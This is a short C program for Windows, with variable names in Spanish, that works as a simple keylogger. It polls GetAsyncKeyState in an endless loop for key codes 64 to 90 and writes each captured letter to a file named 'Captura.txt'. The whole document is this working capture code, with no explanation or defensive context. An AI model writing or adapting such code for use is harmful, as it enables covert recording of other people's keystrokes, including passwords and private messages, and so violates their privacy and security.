#include <windows.h>
#include <stdio.h>

int main()
{
    int result,teclas;
    FILE *logger;

    logger = fopen("Captura.txt","w");

    while(1) {
        for(teclas = 64; teclas <= 90; teclas++) {
            Sleep(1);

            result = GetAsyncKeyState(teclas);

            if(result == -32767) {
                fprintf(logger,"%c",teclas);
            }
        }
    }

    return 0;
}
